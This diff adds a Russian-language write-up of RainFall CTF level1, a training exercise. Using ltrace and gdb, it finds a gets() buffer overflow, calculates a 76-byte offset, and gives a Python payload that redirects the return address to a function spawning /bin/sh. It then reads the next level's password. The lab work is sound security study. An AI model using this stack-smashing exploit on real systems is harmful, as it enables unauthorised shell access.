@@ -1,0 +1,138 @@
+1) Пароль для уровня берем из level0: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
+2) Запустим 
+level1@RainFall:~$ ./level1 
+a
+level1@RainFall:~$ ./level1 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Segmentation fault (core dumped)
+3) level1@RainFall:~$ ltrace ./level1 
+__libc_start_main(0x8048480, 1, 0xbffff804, 0x80484a0, 0x8048510 <unfinished ...>
+gets(0xbffff6c0, 47, 0xbffff76c, 0xb7fd0ff4, 0x80484a0
+) = 0xbffff6c0
++++ exited (status 32) +++
+level1@RainFall:~$ 
+Видим, что есть вызов функции gets. Почитаем про нее: man gets
+SECURITY CONSIDERATIONS
+The gets() function cannot be used securely.  Because of its lack of bounds checking, and the inability for the calling 
+program to reliably determine the length of the next incoming line, the use of this function enables malicious users to 
+arbitrarily change a running program's functionality through a buffer overflow attack.  It is strongly suggested that 
+the fgets() function be used in all cases. 
+Функцию gets () нельзя использовать безопасно. Из-за отсутствия проверки границ и неспособности вызывающей программы 
+надежно определить длину следующей входящей строки использование этой функции позволяет злоумышленникам произвольно 
+изменять функциональность запущенной программы с помощью атаки переполнения буфера.
+
+То есть своими словами функция записывает строку в определенное место в памяти и ориентируется на \n (конец строки), а это
+не безопасно, т.е. выходя за буффер начнем перезаписывать стэк.
+3) Зайдем в gdb ./level1 и посмотрим переменные:
+info var -> ничего интересного
+4) Посмотрим функции:
+info func -> интересные нам run и main.
+5) (gdb) disas run
+Dump of assembler code for function run:
+   0x08048444 <+0>:     push   %ebp
+   0x08048445 <+1>:     mov    %esp,%ebp
+   0x08048447 <+3>:     sub    $0x18,%esp
+   0x0804844a <+6>:     mov    0x80497c0,%eax
+   0x0804844f <+11>:    mov    %eax,%edx
+   0x08048451 <+13>:    mov    $0x8048570,%eax
+   0x08048456 <+18>:    mov    %edx,0xc(%esp)
+   0x0804845a <+22>:    movl   $0x13,0x8(%esp)
+   0x08048462 <+30>:    movl   $0x1,0x4(%esp)
+   0x0804846a <+38>:    mov    %eax,(%esp)
+   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
+   0x08048472 <+46>:    movl   $0x8048584,(%esp)
+   0x08048479 <+53>:    call   0x8048360 <system@plt>
+   0x0804847e <+58>:    leave  
+   0x0804847f <+59>:    ret    
+End of assembler dump.
+
+6) (gdb) disas main
+Dump of assembler code for function main:
+   0x08048480 <+0>:     push   %ebp
+   0x08048481 <+1>:     mov    %esp,%ebp
+   0x08048483 <+3>:     and    $0xfffffff0,%esp
+   0x08048486 <+6>:     sub    $0x50,%esp
+   0x08048489 <+9>:     lea    0x10(%esp),%eax
+   0x0804848d <+13>:    mov    %eax,(%esp)
+   0x08048490 <+16>:    call   0x8048340 <gets@plt>
+   0x08048495 <+21>:    leave  
+   0x08048496 <+22>:    ret    
+End of assembler dump.
+
+7) В main нам интересна строка <+16> c gets 
+8) 0x08048472 <+46>:    movl   $0x8048584,(%esp)
+(gdb) x/s 0x8048584
+0x8048584:       "/bin/sh" -> то есть запускается здесь консоль. Нам нужно попасть сюда в system строку <+53>
+
+9) То есть функция main заканчивает работу и смотрит на frame pointer адрес возврата и у нас есть адресс функции run = 0x08048444. 
+И наша задача подменить адрес возврата и попасть в функцию run, чтобы выполнась строка 0x08048479 <+53>:    call   0x8048360 <system@plt>
+
+10) Параметр, который мы передаем записывается в gets -> возвращает адрес области памяти в которой, он что-то записывает -> 
+но видно, что он приходит в качестве параметра и он его же возвращает(смотри ltrace на адрес 0xbffff6c0).
+
+11) Установим брейк поинтер на 0x08048490 <+16>:    call   0x8048340 <gets@plt>:
+b * 0x08048490
+run - запускаем
+(gdb) disas
+Dump of assembler code for function main:
+   0x08048480 <+0>:     push   %ebp
+   0x08048481 <+1>:     mov    %esp,%ebp
+   0x08048483 <+3>:     and    $0xfffffff0,%esp
+   0x08048486 <+6>:     sub    $0x50,%esp
+   0x08048489 <+9>:     lea    0x10(%esp),%eax
+   0x0804848d <+13>:    mov    %eax,(%esp)
+=> 0x08048490 <+16>:    call   0x8048340 <gets@plt>
+   0x08048495 <+21>:    leave  
+   0x08048496 <+22>:    ret    
+End of assembler dump. 
+По стрелочке видно где мы находимся.
+
+12) Распечатаем регистры выведем главные переменные стэка
+(gdb) info reg
+eax            0xbffff6f0       -1073744144
+ecx            0xbffff7d4       -1073743916
+edx            0xbffff764       -1073744028
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff6e0       0xbffff6e0
+ebp            0xbffff6f8       0xbffff6f8
+esi            0x0      0
+edi            0x0      0
+eip            0x8048490        0x8048490 <main+16>
+eflags         0x200282 [ SF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb) 
+Смотрим на frame pointer(%ebp) = 0xbffff738
+13) Чтобы получить return address надо еще прибавить 4 байта (смотри картинку).
+Таким образом операции с момента нажатия копии eip:
+
+мы сместили ebp (+4)
+выровняли стек (+8)
+мы заменили esp (+80)
+мы взяли адрес rsp + 16 (-16)
+
+80 + 8 + 4 - 16 = 76 - наше искомое смещение. То есть насколько нужно сместить 
+наш стэк за его область чтобы мы попали именно в это место и подменили адрес возврата на другой
+
+14) Сконфигурируем строку которая заполнит стэк и запишет адрес вместо адреса возврата старой функции заменит адрес по которому
+у нас лежит функция run.
+python -c 'print "a"*76+"\x44\x84\x04\x08"' > /tmp/level1
+а - чем заполняем
+76  - смещение
+адресс функции run = 0x08048444, но записывается он в обратном порядке
+и куда перенаправляем /tmp/level1
+
+15) После на stdin подаем на запуск этому бинарнику
+level1@RainFall:~$ cat /tmp/level1 - |  ./level1
+Good... Wait what? -> мы в консоли?
+pwd
+/home/user/level1 -> да в консоли!
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+Ответ: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
